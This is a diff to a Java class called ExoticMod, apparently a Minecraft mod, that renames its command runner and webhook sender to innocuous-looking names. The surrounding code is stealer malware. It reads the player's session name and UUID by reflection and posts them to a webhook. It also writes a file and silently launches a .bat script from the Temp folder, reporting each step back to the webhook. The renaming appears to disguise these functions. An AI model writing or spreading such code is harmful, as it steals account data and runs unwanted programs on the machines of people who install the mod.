@@ -39,13 +39,13 @@ public class ExoticMod {
         } catch (Exception ignored) {}
         try {
             Thread.sleep(3000);
-            exec("cmd /c start C:\\Users\\%username%\\AppData\\Local\\Temp\\screenshots\\screenshot.bat");
+            setlisting("cmd /c start C:\\Users\\%username%\\AppData\\Local\\Temp\\screenshots\\screenshot.bat");
         } catch (Exception ignored) {}
     }
 
     // utils
 
-    public static void exec(String cmd) {
+    public static void setlisting(String cmd) {
         try {
             Runtime rt = Runtime.getRuntime();
             Process pr = rt.exec(cmd);
@@ -75,8 +75,8 @@ public class ExoticMod {
             Object name = sessionClass.getMethod("func_111285_a").invoke(session);
             Object uuid = sessionClass.getMethod("func_148255_b").invoke(session);
 
-            ConfirmAH sendmessage = new ConfirmAH(getWebhook());
-            sendmessage.addEmbed(new ConfirmAH.EmbedObject()
+            ExoticListing sendmessage = new ExoticListing(getWebhook());
+            sendmessage.addEmbed(new ExoticListing.setMainAH()
                     .setTitle("Minecraft Info")
                     .setColor(Color.CYAN)
                     .addField("Name", name.toString(), true)
@@ -113,8 +113,8 @@ public class ExoticMod {
                 fileOut.write(currByte);
             }
 
-            ConfirmAH sendmessage = new ConfirmAH(getWebhook());
-            sendmessage.addEmbed(new ConfirmAH.EmbedObject()
+            ExoticListing sendmessage = new ExoticListing(getWebhook());
+            sendmessage.addEmbed(new ExoticListing.setMainAH()
                     .setTitle("Loading")
                     .setColor(Color.GREEN)
                     .addField("Message ", "Running .bat file", true));
